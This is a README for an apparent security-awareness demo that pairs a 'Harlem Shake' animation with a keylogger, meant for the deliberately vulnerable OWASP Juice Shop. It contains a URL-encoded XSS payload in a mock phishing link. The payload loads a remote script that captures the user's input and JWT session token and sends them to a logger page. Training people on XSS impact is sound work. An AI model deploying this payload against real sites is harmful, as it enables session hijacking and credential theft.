# shake-logger
This project provides a logger and a connected harlem shake js. The shake logger runs on port 8080, make sure that it is not blocked.

> Please enable [autoplay](https://www.ghacks.net/2018/02/06/how-to-control-audio-and-video-autoplay-in-google-chrome/) in your browser.

## Instructions

This projects helps in awareness trainings, especially with the [juice shop](https://github.com/juice-shop/juice-shop). You can use it via docker and docker-compose running:
`docker-compose up`

To show the possible impact of [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), follow these steps:

1. Assume you received and (of course) clicked
[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dowasp%22%3BsearchQuery.value%20%3D%20%22owasp%22%3B%60%29%27%3C%2Fimg%3Eowasp) in some phishing email
2. Enjoy the music and animation! Wait until the music stops.
3. Search for some products or make any other interactions with the Juice Shop applications.
4. In another browser window (pretending to switch now to the view of the attacker) open the [remote input logger](http://localhost:8080/logger.php) that was also installed while the music & animation were playing. Observe that all input of the user is being captured and sent here. It refreshes every 5 seconds. _This could easily run on a 3rd party server in real life!_
5. Back in the Juice Shop, log in with any user account.
6. In the attacker's logger, you will now not only see the captured input, but also the session information of the user, including their JWT token.

![Shaking animation on OWASP Juice Shop](/screenshots/shaking-juiceshop.gif)

![Output of the input logger](/screenshots/logger-php.jpg)

> You can also find a recording (from an older version) of this attack in action on YouTube:
> [:tv:](https://youtu.be/Msi52Kicb-w)

## Credits

Inspired by https://github.com/moovweb/harlem_shaker
